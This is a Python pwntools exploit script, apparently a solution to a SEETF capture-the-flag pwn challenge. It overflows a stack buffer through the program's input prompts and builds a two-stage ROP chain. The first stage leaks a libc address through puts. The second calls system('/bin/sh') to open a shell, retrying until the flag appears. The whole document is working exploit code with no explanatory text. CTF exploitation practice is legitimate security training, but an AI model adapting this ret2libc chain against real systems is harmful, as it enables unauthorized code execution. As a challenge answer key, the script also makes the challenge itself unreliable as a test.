from pwn import*
import subprocess #spawm process
elf = context.binary = ELF('chall_patched')
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')
local = True 
if local:
    #p = process("./chall_patched")
    #gdb.attach(p,'''b*main\nc''')
    a=1
else:
    p = remote('win.the.seetf.sg', 2004)
elf = context.binary = ELF('./chall_patched', checksec=False)

def cmt(data):
    p.sendafter(b'tale.', data)

def number(value):
    p.sendlineafter(b'number!', value)



while(1):
    try:
        #p = remote('win.the.seetf.sg', 2004)
        p = process('./chall_patched')
        main = 0x000000000040122e
        ret = 0x000000000040101a
        rdi = 0x0000000000401313
        puts_plt = 0x401080
        puts_got = 0x404018

        payload = flat(
            ret, rdi, puts_got, puts_plt,
            main
        )

        cmt(b'A'*0x30 + payload)
        number(b'+')
        number(str(struct.unpack('f', b'\0\0\x41\0')[0]).encode())
        number(b'+')
        p.recvline()
        libc.address = int.from_bytes(p.recv(6),'little') - 0x84420
        log.info('Libc_base: ' + hex(libc.address))
        

        payload = flat(
            ret,ret, rdi, next(libc.search(b'/bin/sh')), libc.sym['system']
            #libc.address + 0x18c338,
            #libc.address + 0x45000
        )

        cmt(b'A'*0x30 + payload)
        number(b'+')
        number(str(struct.unpack('f', b'\0\0\x41\x00')[0]).encode())
        #number(b'')
        #p.sendline(b'cat flag')
        p.interactive()
    except:
        win =  p.recvall()
        if b'SEE{' in win:
            break